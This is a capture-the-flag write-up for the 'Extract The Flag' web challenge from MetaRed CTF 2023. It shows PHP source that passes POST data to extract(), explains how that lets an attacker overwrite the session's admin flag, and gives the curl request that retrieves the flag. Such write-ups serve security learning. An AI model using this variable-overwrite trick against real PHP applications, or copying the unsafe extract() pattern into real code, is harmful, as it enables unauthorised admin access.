---
title: MetaRed CTF 2023 - Extract The Flag
date: Thu Oct 26 03:46:38 PM +04 2023
categories: [Writeup]
tags: [ctf,metaredctf,metaredctf2023,web,php]
---

## Description

\<No Description After CTF Ended...\>

[Challenge](https://extracttheflag.ctf.cert.unlp.edu.ar/)<br>
[Source](https://extracttheflag.ctf.cert.unlp.edu.ar/?src)

## Solution

```php
<?php
if (isset($_GET['src'])) {
    highlight_file(__FILE__);
    die();
}

error_reporting(0);
include_once 'flag.php';
session_start();
$_SESSION['admin'] = false;
extract($_POST);
?>
...
<div class="row">
    <div class="card">
        <h4>Flag</h4>
        <!-- admin content -->
        <?php
        if (isset($_SESSION['admin'])) {
            if ($_SESSION['admin']) {
                echo "Your flag: " . $flag;
                echo "<br>";
            }
        }
        ?>
    </div>
</div>
...
```

The vulnaribility with given php code is **[extract](https://www.php.net/manual/en/function.extract.php)**. Basically if you pass array such as `[name=>Ryan]`,after `extract` you will have access to variable named `name` with value `Ryan`. This introduces vulnaribility because we can also overwrite variables.

```bash
➜ curl -X POST 'https://extracttheflag.ctf.cert.unlp.edu.ar/' -d "_SESSION[admin]=true"
...
<div class="row">
    <div class="card">
        <h4>Flag</h4>
        <!-- admin content -->
        Your flag: flag{PhP_Th4nks_for_all!}<br>
    </div>
</div>
...
```

> Flag: flag{PhP_Th4nks_for_all!}
{: .prompt-tip }